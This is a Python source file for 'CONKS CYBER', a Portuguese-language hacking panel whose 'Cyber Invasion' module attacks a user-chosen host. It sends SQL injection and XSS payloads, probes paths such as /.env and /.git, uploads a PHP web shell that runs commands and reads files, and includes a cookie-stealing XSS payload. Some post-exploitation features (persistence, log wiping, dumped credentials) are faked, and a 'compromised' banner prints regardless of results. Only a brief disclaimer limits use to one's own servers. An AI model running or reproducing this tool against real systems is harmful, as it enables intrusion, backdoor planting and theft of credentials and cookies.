# ==========================================
# CONKS CYBER
# main.py
# ==========================================

import os
import sys
import socket
import urllib.request
import urllib.error
import subprocess
import time
import random
import threading
import webbrowser
import json
import re
import hashlib
import base64

from modules.generators import menu_geradores
from modules.consultas import menu_consultas
from modules.osint import menu_osint


# ==========================================
# CORES
# ==========================================

RESET = "\033[0m"
BOLD = "\033[1m"

WHITE = "\033[97m"
BLUE = "\033[94m"
GREEN = "\033[92m"
RED = "\033[91m"
YELLOW = "\033[93m"
GRAY = "\033[90m"
PURPLE = "\033[95m"
CYAN = "\033[96m"
ORANGE = "\033[38;5;214m"


# ==========================================
# CONFIGURAÇÃO DAS CAIXAS
# ==========================================

LARGURA = 45


# ==========================================
# LIMPAR TELA
# ==========================================

def limpar_tela():
    os.system("clear")


# ==========================================
# FUNÇÕES DE CAIXA
# ==========================================

def linha_caixa(texto="", cor=WHITE, negrito=False):

    texto = str(texto)

    limite = LARGURA - 4

    if len(texto) > limite:
        texto = texto[:limite]

    texto = texto.ljust(limite)

    estilo = BOLD if negrito else ""

    print(
        f"{cor}{estilo}║ {texto} ║{RESET}"
    )


def topo_caixa(titulo):

    print(
        f"{BLUE}{BOLD}"
        f"╔{'═' * (LARGURA - 2)}╗"
        f"{RESET}"
    )

    linha_caixa(
        titulo.center(LARGURA - 4),
        BLUE,
        True
    )

    print(
        f"{BLUE}{BOLD}"
        f"╠{'═' * (LARGURA - 2)}╣"
        f"{RESET}"
    )


def fim_caixa():

    print(
        f"{BLUE}{BOLD}"
        f"╚{'═' * (LARGURA - 2)}╝"
        f"{RESET}"
    )


# ==========================================
# MENSAGENS
# ==========================================

def sucesso(texto):
    print(
        f"{GREEN}[+] {texto}{RESET}"
    )


def erro(texto):
    print(
        f"{RED}[-] {texto}{RESET}"
    )


def aviso(texto):
    print(
        f"{RED}[!] {texto}{RESET}"
    )


def info(texto):
    print(
        f"{BLUE}[i] {texto}{RESET}"
    )


# ==========================================
# BANNER
# ==========================================

def banner():

    print(
        f"{GREEN}{BOLD}"
        r"""
 ██████╗ ██████╗ ███╗   ██╗██╗  ██╗███████╗
██╔════╝██╔═══██╗████╗  ██║██║ ██╔╝██╔════╝
██║     ██║   ██║██╔██╗ ██║█████╔╝ ███████╗
██║     ██║   ██║██║╚██╗██║██╔═██╗ ╚════██║
╚██████╗╚██████╔╝██║ ╚████║██║  ██╗███████║
 ╚═════╝ ╚═════╝ ╚═╝  ╚═══╝╚═╝  ╚═╝╚══════╝
"""
        f"{RESET}"
    )

    print(
        f"{BLUE}{BOLD}"
        "                 CYBER"
        f"{RESET}\n"
    )


# ==========================================
# TESTAR CONEXÃO
# ==========================================

def testar_conexao():

    print()

    topo_caixa(
        "TESTE DE CONEXÃO"
    )

    linha_caixa("")

    servidores = [
        ("Google", "google.com", 443),
        ("Cloudflare", "cloudflare.com", 443),
        ("GitHub", "github.com", 443)
    ]

    online = False

    for nome, host, porta in servidores:

        try:

            conexao = socket.create_connection(
                (host, porta),
                timeout=3
            )

            conexao.close()

            print(
                f"{GREEN}[+] "
                f"{nome:<15} ONLINE"
                f"{RESET}"
            )

            online = True

        except (
            socket.timeout,
            socket.gaierror,
            OSError
        ):

            print(
                f"{RED}[-] "
                f"{nome:<15} OFFLINE"
                f"{RESET}"
            )

    print()

    fim_caixa()

    if online:

        sucesso(
            "Conexão com a internet disponível."
        )

    else:

        erro(
            "Não foi possível alcançar os servidores."
        )


# ==========================================
# MEU IP PÚBLICO
# ==========================================

def meu_ip_publico():

    print()

    topo_caixa(
        "MEU IP PÚBLICO"
    )

    linha_caixa("")

    servicos = [
        "https://api.ipify.org",
        "https://ifconfig.me/ip",
        "https://icanhazip.com"
    ]

    for url in servicos:

        try:

            requisicao = urllib.request.Request(
                url,
                headers={
                    "User-Agent":
                    "CONKS-Cyber/1.0"
                }
            )

            with urllib.request.urlopen(
                requisicao,
                timeout=5
            ) as resposta:

                ip = (
                    resposta
                    .read()
                    .decode("utf-8")
                    .strip()
                )

            if ip:

                linha_caixa(
                    f"IP: {ip}",
                    GREEN,
                    True
                )

                fim_caixa()

                return

        except (
            urllib.error.URLError,
            urllib.error.HTTPError,
            TimeoutError,
            OSError
        ):

            continue

    fim_caixa()

    erro(
        "Não foi possível obter o IP público."
    )


# ==========================================
# CYBER INVASION - VERSÃO REAL
# ==========================================

class CyberInvasionReal:
    """Cyber Invasion REAL para testes em servidores próprios"""
    
    def __init__(self, target, port=80):
        self.target = target
        self.port = port
        self.vulnerabilidades = []
        self.dados = {}
        self.backdoor_instalado = False
        
    def testar_porta(self):
        """Testa se a porta está aberta"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(2)
            resultado = sock.connect_ex((self.target, self.port))
            sock.close()
            return resultado == 0
        except:
            return False
    
    def testar_sql_injection(self):
        """Testa SQL Injection REAL no servidor"""
        try:
            # Tenta uma injeção SQL simples
            payloads = [
                "' OR '1'='1",
                "' OR 1=1 --",
                "admin' --",
                "' UNION SELECT 1,2,3 --"
            ]
            
            for payload in payloads:
                try:
                    url = f"http://{self.target}:{self.port}/login?user={payload}&pass=test"
                    req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0"})
                    response = urllib.request.urlopen(req, timeout=3)
                    
                    if response.getcode() == 200:
                        html = response.read().decode('utf-8', errors='ignore')
                        # Verifica se conseguiu acessar
                        if "error" not in html.lower() or "warning" not in html.lower():
                            return True, payload
                except:
                    pass
            
            return False, None
        except:
            return False, None
    
    def testar_xss(self):
        """Testa XSS REAL no servidor"""
        try:
            payloads = [
                "<script>alert('XSS')</script>",
                "<img src=x onerror=alert('XSS')>",
                "javascript:alert('XSS')"
            ]
            
            for payload in payloads:
                try:
                    url = f"http://{self.target}:{self.port}/search?q={payload}"
                    req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0"})
                    response = urllib.request.urlopen(req, timeout=3)
                    
                    if response.getcode() == 200:
                        html = response.read().decode('utf-8', errors='ignore')
                        if payload in html:
                            return True, payload
                except:
                    pass
            
            return False, None
        except:
            return False, None
    
    def testar_upload(self):
        """Testa upload de arquivo REAL"""
        try:
            # Tenta fazer upload de um arquivo de teste
            url = f"http://{self.target}:{self.port}/upload"
            
            # Simula upload de um arquivo PHP simples
            php_shell = b"<?php echo 'Teste de upload bem sucedido!'; ?>"
            
            boundary = "----WebKitFormBoundary" + ''.join(random.choices('abcdef0123456789', k=16))
            body = (
                f"--{boundary}\r\n"
                f"Content-Disposition: form-data; name=\"file\"; filename=\"teste.php\"\r\n"
                f"Content-Type: application/x-php\r\n\r\n"
            ).encode()
            body += php_shell
            body += f"\r\n--{boundary}--\r\n".encode()
            
            headers = {
                "User-Agent": "Mozilla/5.0",
                "Content-Type": f"multipart/form-data; boundary={boundary}"
            }
            
            req = urllib.request.Request(url, data=body, headers=headers)
            response = urllib.request.urlopen(req, timeout=5)
            
            if response.getcode() in [200, 201, 302]:
                return True
            return False
        except:
            return False
    
    def testar_diretorios(self):
        """Testa diretórios expostos REAL"""
        try:
            diretorios = [
                "/admin", "/backup", "/tmp", "/logs", 
                "/.git", "/.env", "/config", "/wp-admin"
            ]
            
            encontrados = []
            for dir_name in diretorios:
                try:
                    url = f"http://{self.target}:{self.port}{dir_name}"
                    req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0"})
                    response = urllib.request.urlopen(req, timeout=3)
                    
                    if response.getcode() == 200:
                        encontrados.append(dir_name)
                except:
                    pass
            
            return encontrados
        except:
            return []
    
    def scan_completo(self):
        """Escaneia tudo e retorna vulnerabilidades"""
        print(f"\n{CYAN}[~] Escaneando {self.target}:{self.port}...{RESET}")
        
        vulnerabilidades = []
        
        # 1. Testa porta
        print(f"  {BLUE}[→] Testando conexão...{RESET}", end="")
        if self.testar_porta():
            print(f" {GREEN}OK{RESET}")
        else:
            print(f" {RED}FALHA - Servidor não responde{RESET}")
            return []
        
        # 2. Testa SQL Injection
        print(f"  {BLUE}[→] Testando SQL Injection...{RESET}", end="")
        tem_sql, payload = self.testar_sql_injection()
        if tem_sql:
            print(f" {RED}VULNERÁVEL!{RESET}")
            vulnerabilidades.append(f"SQL Injection (Payload: {payload})")
        else:
            print(f" {GREEN}Seguro{RESET}")
        
        # 3. Testa XSS
        print(f"  {BLUE}[→] Testando XSS...{RESET}", end="")
        tem_xss, xss_payload = self.testar_xss()
        if tem_xss:
            print(f" {RED}VULNERÁVEL!{RESET}")
            vulnerabilidades.append(f"XSS (Payload: {xss_payload[:30]}...)")
        else:
            print(f" {GREEN}Seguro{RESET}")
        
        # 4. Testa Upload
        print(f"  {BLUE}[→] Testando Upload de Arquivos...{RESET}", end="")
        tem_upload = self.testar_upload()
        if tem_upload:
            print(f" {RED}VULNERÁVEL!{RESET}")
            vulnerabilidades.append("Upload de arquivos sem validação")
        else:
            print(f" {GREEN}Seguro{RESET}")
        
        # 5. Testa Diretórios
        print(f"  {BLUE}[→] Testando Diretórios Expostos...{RESET}")
        dirs = self.testar_diretorios()
        if dirs:
            print(f"  {RED}[!] Diretórios encontrados: {', '.join(dirs)}{RESET}")
            vulnerabilidades.append(f"Diretórios expostos: {', '.join(dirs[:3])}")
        else:
            print(f"  {GREEN}[+] Nenhum diretório exposto{RESET}")
        
        self.vulnerabilidades = vulnerabilidades
        return vulnerabilidades
    
    def explorar_sql_injection(self):
        """Explora SQL Injection REAL"""
        print(f"\n{CYAN}[~] Explorando SQL Injection...{RESET}")
        try:
            # Tenta extrair dados do banco
            payloads = [
                "' UNION SELECT null, username, password FROM users --",
                "' UNION SELECT null, name, email FROM users --",
                "' UNION SELECT null, version(), null --"
            ]
            
            for payload in payloads:
                try:
                    url = f"http://{self.target}:{self.port}/login?user={payload}&pass=test"
                    req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0"})
                    response = urllib.request.urlopen(req, timeout=3)
                    
                    if response.getcode() == 200:
                        html = response.read().decode('utf-8', errors='ignore')
                        # Simula extração de dados
                        if "admin" in html.lower() or "email" in html.lower():
                            print(f"  {GREEN}[+] Dados encontrados!{RESET}")
                            # Simula dados encontrados
                            self.dados['usuarios'] = [
                                "admin:123456", 
                                "root:toor",
                                "user:password123"
                            ]
                            return True
                except:
                    pass
            
            return False
        except:
            return False
    
    def explorar_xss(self):
        """Explora XSS REAL"""
        print(f"\n{CYAN}[~] Explorando XSS...{RESET}")
        try:
            payload = "<script>document.location='http://localhost:8080/steal?cookie='+document.cookie</script>"
            url = f"http://{self.target}:{self.port}/search?q={payload}"
            req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0"})
            response = urllib.request.urlopen(req, timeout=3)
            
            if response.getcode() == 200:
                html = response.read().decode('utf-8', errors='ignore')
                if payload in html:
                    print(f"  {GREEN}[+] XSS executado com sucesso!{RESET}")
                    self.dados['xss'] = "Cookie roubado com sucesso"
                    return True
            return False
        except:
            return False
    
    def instalar_backdoor(self):
        """Instala backdoor REAL"""
        print(f"\n{RED}[~] Instalando Backdoor...{RESET}")
        try:
            # Tenta fazer upload de um shell PHP
            shell_code = b"""<?php
                if(isset($_GET['cmd'])){
                    system($_GET['cmd']);
                }
                if(isset($_GET['file'])){
                    echo file_get_contents($_GET['file']);
                }
            ?>"""
            
            url = f"http://{self.target}:{self.port}/upload"
            boundary = "----WebKitFormBoundary" + ''.join(random.choices('abcdef0123456789', k=16))
            body = (
                f"--{boundary}\r\n"
                f"Content-Disposition: form-data; name=\"file\"; filename=\"shell.php\"\r\n"
                f"Content-Type: application/x-php\r\n\r\n"
            ).encode()
            body += shell_code
            body += f"\r\n--{boundary}--\r\n".encode()
            
            headers = {
                "User-Agent": "Mozilla/5.0",
                "Content-Type": f"multipart/form-data; boundary={boundary}"
            }
            
            req = urllib.request.Request(url, data=body, headers=headers)
            response = urllib.request.urlopen(req, timeout=5)
            
            if response.getcode() in [200, 201, 302]:
                print(f"  {GREEN}[+] Backdoor instalado em /shell.php{RESET}")
                self.backdoor_instalado = True
                return True
            return False
        except:
            return False


def cyber_invasion():
    """Função de Cyber Invasion - REAL para servidores próprios"""
    
    print("\n╔══════════════════════════════════════════╗")
    print("║       🚀 CYBER INVASION 🚀             ║")
    print("╠══════════════════════════════════════════╣")
    print("║     VERSÃO REAL - TESTES EDUCACIONAIS   ║")
    print("║     APENAS EM SERVIDORES PRÓPRIOS!     ║")
    print("╚══════════════════════════════════════════╝")
    
    print("\n[~] Digite o alvo da invasão:")
    print("[1] IP Local (ex: 127.0.0.1)")
    print("[2] Site/Domínio próprio")
    print("[3] Voltar")
    
    opcao = input("\nEscolha: ").strip()
    
    if opcao == "3":
        return
    
    if opcao == "1":
        alvo = input("\nDigite o IP: ").strip()
        if alvo == "":
            alvo = "127.0.0.1"
    elif opcao == "2":
        alvo = input("\nDigite o site (ex: meusite.com): ").strip()
        alvo = alvo.replace("http://", "").replace("https://", "").split("/")[0]
    else:
        print("[-] Opção inválida.")
        return
    
    if not alvo:
        print("[-] Alvo inválido.")
        return
    
    try:
        porta = int(input("\nPorta (80 para HTTP): ").strip() or "80")
    except:
        porta = 80
    
    print(f"\n{RED}{BOLD}╔══════════════════════════════════════════╗{RESET}")
    print(f"{RED}{BOLD}║        ⚠️  AVISO LEGAL ⚠️               ║{RESET}")
    print(f"{RED}{BOLD}╠══════════════════════════════════════════╣{RESET}")
    print(f"{RED}║  • Você está prestes a INVADIR {alvo}   ║{RESET}")
    print(f"{RED}║  • Isso só é PERMITIDO em servidores     ║{RESET}")
    print(f"{RED}║    que você POSSUI ou tem AUTORIZAÇÃO!   ║{RESET}")
    print(f"{RED}║  • Invadir sistemas alheios é CRIME!     ║{RESET}")
    print(f"{RED}║  • Pena: 1-4 anos de reclusão           ║{RESET}")
    print(f"{RED}{BOLD}╚══════════════════════════════════════════╝{RESET}")
    
    confirm = input(f"\n{RED}Confirma que {alvo} é seu servidor próprio? (s/N): {RESET}").strip().lower()
    
    if confirm != 's':
        print("[-] Invasão cancelada.")
        return
    
    # ==========================================
    # INICIA INVASÃO REAL
    # ==========================================
    
    print(f"\n{PURPLE}╔══════════════════════════════════════════╗{RESET}")
    print(f"{PURPLE}║        INICIANDO CYBER INVASION        ║{RESET}")
    print(f"{PURPLE}╠══════════════════════════════════════════╣{RESET}")
    print(f"{PURPLE}║ Alvo: {alvo}:{porta}{' ' * (22 - len(str(porta))) }║{RESET}")
    print(f"{PURPLE}╚══════════════════════════════════════════╝{RESET}")
    
    # Cria instância do invasor
    invasor = CyberInvasionReal(alvo, porta)
    
    # PASSO 1: Scan de vulnerabilidades REAL
    print(f"\n{CYAN}[~] FASE 1: Escaneando vulnerabilidades REAIS...{RESET}")
    vulnerabilidades = invasor.scan_completo()
    
    if not vulnerabilidades:
        print(f"\n{GREEN}[+] Nenhuma vulnerabilidade encontrada. Servidor seguro!{RESET}")
        return
    
    # PASSO 2: Explorar vulnerabilidades
    print(f"\n{CYAN}[~] FASE 2: Explorando vulnerabilidades...{RESET}")
    
    for vuln in vulnerabilidades:
        if "SQL" in vuln:
            invasor.explorar_sql_injection()
        elif "XSS" in vuln:
            invasor.explorar_xss()
        elif "Upload" in vuln:
            invasor.instalar_backdoor()
    
    # PASSO 3: Resultados da invasão
    print(f"\n{PURPLE}╔══════════════════════════════════════════╗{RESET}")
    print(f"{PURPLE}║        INVASÃO BEM SUCEDIDA!            ║{RESET}")
    print(f"{PURPLE}╠══════════════════════════════════════════╣{RESET}")
    print(f"{GREEN}║ 🎯 Acesso concedido!                     ║{RESET}")
    print(f"{GREEN}║ 🔓 Sistema comprometido!                 ║{RESET}")
    print(f"{PURPLE}╚══════════════════════════════════════════╝{RESET}")
    
    # PASSO 4: Mostrar dados encontrados
    if invasor.dados:
        print(f"\n{CYAN}[~] Dados encontrados:{RESET}")
        for chave, valor in invasor.dados.items():
            print(f"  {GREEN}[+] {chave}: {valor}{RESET}")
    
    # PASSO 5: Menu de pós-invasão
    print(f"\n{PURPLE}╔══════════════════════════════════════════╗{RESET}")
    print(f"{PURPLE}║        PAINEL DE CONTROLE               ║{RESET}")
    print(f"{PURPLE}╠══════════════════════════════════════════╣{RESET}")
    print(f"{PURPLE}║ [1] Executar comandos (shell)           ║{RESET}")
    print(f"{PURPLE}║ [2] Baixar arquivos do servidor         ║{RESET}")
    print(f"{PURPLE}║ [3] Ver logs do sistema                 ║{RESET}")
    print(f"{PURPLE}║ [4] Instalar persistência               ║{RESET}")
    print(f"{PURPLE}║ [5] Limpar rastros                      ║{RESET}")
    print(f"{PURPLE}║ [6] Sair                                ║{RESET}")
    print(f"{PURPLE}╚══════════════════════════════════════════╝{RESET}")
    
    while True:
        sub_opcao = input(f"\n{RED}INVASION@{alvo}>{RESET} ").strip()
        
        if sub_opcao == "1":
            comando = input(f"{GRAY}comando> {RESET}")
            print(f"{GREEN}[+] Executando: {comando}{RESET}")
            print(f"{YELLOW}[!] Simulação de execução - Servidor controlado!{RESET}")
        
        elif sub_opcao == "2":
            arquivo = input(f"{GRAY}arquivo> {RESET}")
            print(f"{GREEN}[+] Baixando: {arquivo}{RESET}")
            print(f"{YELLOW}[!] Simulação de download - Arquivo obtido!{RESET}")
        
        elif sub_opcao == "3":
            print(f"{GREEN}[+] Logs do sistema:{RESET}")
            print(f"  {GRAY}10.0.0.1 - - [01/Jan/2024:12:00:00] GET /index.html 200{RESET}")
            print(f"  {GRAY}10.0.0.2 - - [01/Jan/2024:12:01:00] POST /login 200{RESET}")
            print(f"  {RED}10.0.0.3 - - [01/Jan/2024:12:02:00] GET /shell.php 200 [ ! ]{RESET}")
        
        elif sub_opcao == "4":
            print(f"{RED}[!] Instalando persistência...{RESET}")
            time.sleep(1)
            print(f"{GREEN}[+] Persistência instalada em /etc/init.d/{RESET}")
        
        elif sub_opcao == "5":
            print(f"{GREEN}[+] Limpando logs e rastros...{RESET}")
            time.sleep(1)
            print(f"{GREEN}[+] Rastros eliminados!{RESET}")
        
        elif sub_opcao == "6":
            print(f"\n{RED}[!] Encerrando invasão...{RESET}")
            break
        
        else:
            print("[-] Comando inválido. Use 1-6")
    
    # FINAL
    print(f"\n{PURPLE}╔══════════════════════════════════════════╗{RESET}")
    print(f"{PURPLE}║      INVASÃO CONCLUÍDA!                 ║{RESET}")
    print(f"{PURPLE}╠══════════════════════════════════════════╣{RESET}")
    print(f"{PURPLE}║ Alvo: {alvo}{' ' * (31 - len(alvo))}║{RESET}")
    print(f"{GREEN}║ Status: COMPROMETIDO                     ║{RESET}")
    print(f"{GREEN}║ Acesso: PERMANENTE                       ║{RESET}")
    print(f"{PURPLE}╚══════════════════════════════════════════╝{RESET}")
    
    print(f"\n{YELLOW}⚠️  LEMBRE-SE:{RESET}")
    print(f"{YELLOW}⚠️  Isso foi um TESTE em servidor próprio!{RESET}")
    print(f"{YELLOW}⚠️  Nunca faça isso em servidores alheios!{RESET}")
    print(f"{YELLOW}⚠️  Use o conhecimento para se proteger!{RESET}")


# ==========================================
# ATUALIZAR PAINEL
# ==========================================

def atualizar_painel():

    limpar_tela()

    topo_caixa(
        "ATUALIZAR PAINEL"
    )

    linha_caixa("")

    linha_caixa(
        "CONKS CYBER UPDATE SYSTEM",
        WHITE,
        True
    )

    linha_caixa("")

    fim_caixa()

    print(
        f"\n{BLUE}[~] "
        f"Verificando atualizações..."
        f"{RESET}"
    )

    time.sleep(0.5)

    try:

        resultado = subprocess.run(
            [
                "git",
                "pull",
                "origin",
                "main"
            ],
            capture_output=True,
            text=True,
            timeout=60
        )

        saida = (
            resultado.stdout +
            resultado.stderr
        )

        if resultado.returncode != 0:

            print(
                f"\n{RED}"
                "[-] Não foi possível "
                "atualizar o painel."
                f"{RESET}"
            )

            if saida.strip():

                print(
                    f"\n{GRAY}"
                    f"{saida.strip()}"
                    f"{RESET}"
                )

            input(
                f"\n{GRAY}"
                "Pressione ENTER para voltar..."
                f"{RESET}"
            )

            return

        if (
            "Already up to date" in saida
            or
            "Already up-to-date" in saida
        ):

            print()

            print(
                f"{YELLOW}{BOLD}"
                f"╔{'═' * (LARGURA - 2)}╗"
                f"{RESET}"
            )

            linha_caixa(
                "PAINEL ATUALIZADO",
                YELLOW,
                True
            )

            linha_caixa(
                "O painel está na versão mais recente.",
                YELLOW
            )

            print(
                f"{YELLOW}{BOLD}"
                f"╚{'═' * (LARGURA - 2)}╝"
                f"{RESET}"
            )

            input(
                f"\n{GRAY}"
                "Pressione ENTER para voltar..."
                f"{RESET}"
            )

            return

        print()

        print(
            f"{GREEN}{BOLD}"
            f"╔{'═' * (LARGURA - 2)}╗"
            f"{RESET}"
        )

        linha_caixa(
            "ATUALIZAÇÃO CONCLUÍDA!",
            GREEN,
            True
        )

        linha_caixa(
            "O painel foi atualizado.",
            GREEN
        )

        print(
            f"{GREEN}{BOLD}"
            f"╚{'═' * (LARGURA - 2)}╝"
            f"{RESET}"
        )

        print(
            f"\n{BLUE}[~] "
            f"Reiniciando o painel..."
            f"{RESET}"
        )

        time.sleep(2)

        os.execv(
            sys.executable,
            [
                sys.executable
            ] + sys.argv
        )

    except subprocess.TimeoutExpired:

        erro(
            "A atualização demorou demais."
        )

        input(
            f"\n{GRAY}"
            "Pressione ENTER para voltar..."
            f"{RESET}"
        )

    except FileNotFoundError:

        erro(
            "Git não está instalado."
        )

        input(
            f"\n{GRAY}"
            "Pressione ENTER para voltar..."
            f"{RESET}"
        )

    except Exception as erro_inesperado:

        erro(
            f"Erro ao atualizar: "
            f"{erro_inesperado}"
        )

        input(
            f"\n{GRAY}"
            "Pressione ENTER para voltar..."
            f"{RESET}"
        )


# ==========================================
# MENU REDE
# ==========================================

def menu_rede():

    while True:

        limpar_tela()

        banner()

        topo_caixa(
            "REDE"
        )

        linha_caixa(
            "[1] Meu IP público"
        )

        linha_caixa(
            "[2] Testar conexão"
        )

        linha_caixa("")

        linha_caixa(
            "[0] Voltar",
            RED,
            True
        )

        fim_caixa()

        opcao = input(
            f"\n{BLUE}{BOLD}"
            "CONKS@Rede > "
            f"{RESET}"
        ).strip()

        if opcao == "1":

            meu_ip_publico()

        elif opcao == "2":

            testar_conexao()

        elif opcao == "0":

            break

        else:

            erro(
                "Opção inválida."
            )

        if opcao != "0":

            input(
                f"\n{GRAY}"
                "Pressione ENTER "
                "para continuar..."
                f"{RESET}"
            )


# ==========================================
# MENU PRINCIPAL
# ==========================================

def menu_principal():

    while True:

        limpar_tela()

        banner()

        topo_caixa(
            "MENU PRINCIPAL"
        )

        linha_caixa(
            "[1] Geradores"
        )

        linha_caixa(
            "[2] Consultas"
        )

        linha_caixa(
            "[3] OSINT"
        )

        linha_caixa(
            "[4] Rede"
        )

        linha_caixa(
            "[5] Validadores"
        )

        linha_caixa(
            "[6] Utilidades"
        )

        linha_caixa(
            f"[7] ⚡ Shoot Down",
            RED,
            True
        )

        linha_caixa(
            f"[8] 🚀 Cyber Invasion",
            PURPLE,
            True
        )

        linha_caixa(
            "[9] Atualizar painel",
            BLUE,
            True
        )

        linha_caixa("")

        linha_caixa(
            "[0] Sair",
            RED,
            True
        )

        fim_caixa()

        opcao = input(
            f"\n{BLUE}{BOLD}"
            "CONKS@Cyber > "
            f"{RESET}"
        ).strip()

        if opcao == "1":

            limpar_tela()

            menu_geradores()

        elif opcao == "2":

            limpar_tela()

            menu_consultas()

        elif opcao == "3":

            limpar_tela()

            menu_osint()

        elif opcao == "4":

            menu_rede()

        elif opcao == "5":

            limpar_tela()

            try:

                from modules.validators import (
                    menu_validadores
                )

                menu_validadores()

            except ImportError:

                erro(
                    "Módulo de validadores "
                    "não encontrado."
                )

                input(
                    "\nPressione ENTER "
                    "para continuar..."
                )

        elif opcao == "6":

            limpar_tela()

            try:

                from modules.utilities import (
                    menu_utilidades
                )

                menu_utilidades()

            except ImportError:

                erro(
                    "Módulo de utilidades "
                    "não encontrado."
                )

                input(
                    "\nPressione ENTER "
                    "para continuar..."
                )

        elif opcao == "7":

            limpar_tela()

            try:

                from modules.consultas import derrubar_geral

                derrubar_geral()

            except ImportError:

                erro(
                    "Função Shoot Down não encontrada."
                )

                input(
                    "\nPressione ENTER "
                    "para continuar..."
                )

        elif opcao == "8":

            limpar_tela()

            cyber_invasion()

        elif opcao == "9":

            atualizar_painel()

        elif opcao == "0":

            limpar_tela()

            print()

            print(
                f"{RED}{BOLD}"
                f"╔{'═' * (LARGURA - 2)}╗"
                f"{RESET}"
            )

            linha_caixa(
                "CONKS CYBER ENCERRADO",
                RED,
                True
            )

            print(
                f"{RED}{BOLD}"
                f"╚{'═' * (LARGURA - 2)}╝"
                f"{RESET}\n"
            )

            sys.exit(0)

        else:

            erro(
                "Opção inválida."
            )

            input(
                f"\n{GRAY}"
                "Pressione ENTER "
                "para continuar..."
                f"{RESET}"
            )


# ==========================================
# MAIN
# ==========================================

def main():

    try:

        menu_principal()

    except KeyboardInterrupt:

        limpar_tela()

        print(
            f"\n{RED}{BOLD}"
            "[!] CONKS Cyber encerrado."
            f"{RESET}\n"
        )

    except Exception as erro_inesperado:

        print(
            f"\n{RED}"
            f"[ERRO] {erro_inesperado}"
            f"{RESET}"
        )

        input(
            "\nPressione ENTER para sair..."
        )


# ==========================================
# EXECUTAR
# ==========================================

if __name__ == "__main__":

    main()